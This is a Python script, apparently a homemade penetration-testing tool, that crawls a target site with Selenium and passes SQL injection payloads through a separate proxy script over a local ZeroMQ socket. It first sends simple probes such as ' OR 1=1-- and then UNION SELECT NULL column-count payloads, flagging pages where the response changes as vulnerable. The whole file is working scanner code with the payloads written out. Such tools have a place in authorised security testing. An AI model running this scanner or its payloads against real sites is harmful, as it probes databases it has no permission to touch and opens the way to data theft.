import sys
from selenium import webdriver
from selenium.webdriver.common.by import By
import zmq


driver = webdriver.Firefox()
url = sys.argv[1]
driver.get(url)

# setting up the socket for the 2 programs to communicate
context = zmq.Context()
socket = context.socket(zmq.PAIR)
socket.connect("tcp://127.0.0.1:5555")

# send the payload over to the proxy script to modify the packet with it
def start_script(payload):
    print(f"sending payload:{payload} over to script" )
    socket.send_string(payload)


def stop_script():
    socket.send_string("stop")

 # send the paylaods, check if the response is a 400 or 500, if not compare original and new source 
def test_payloads(page):
    #get the page source
    source = driver.page_source
    union_select = "' UNION SELECT NULL--", "' UNION SELECT NULL, NULL--", "' UNION SELECT NULL, NULL, NULL--", "' UNION SELECT NULL, NULL, NULL, NULL--", "' UNION SELECT NULL, NULL, NULL, NULL, NULL--"
    # go through various payloads, get the new page source to compare to the original, and check the http status code 
    for payload in union_select:
        start_script(payload)
        driver.get(page)
        stop_script()
        status = socket.recv_string()
        new_source = driver.page_source
        if source != new_source and status[0] != "4" and status[0] != "5":
            print("this page is vulnerable to SQLi")
            return True


def crawl_site():
    links = []
    already_visited = set()
    found_endpoint = False
    tests = [ "--", "'+OR+1=1--", "' OR 1=1--"]
    # crawl through the site, and test very basic sqli to see which pages may be vulnerable
    while not found_endpoint:
        page_links = driver.find_elements(By.XPATH, "//a[@href]")
        for link in page_links:
            print(link.get_attribute("href"))
            if link.get_attribute("href") not in links and url in link.get_attribute("href") and link.get_attribute("href") not in already_visited:
                links.append(link.get_attribute("href"))
        next_page = links.pop()
        driver.get(next_page)
        # go through basic sql payloads that may indicate a vulnerability to find vulnerable areas on the site to test further
        for test in tests:
            print(test)
            start_script(test)
            driver.get(next_page)
            new_source = driver.page_source
            stop_script()
            if test in new_source:
                print("it's reflecting " + test)
                # we think it may be vulnerable so call new function up to test more advanced payloads
                if test_payloads(next_page):
                    return True
        stop_script()


if __name__ == "__main__":
    crawl_site()
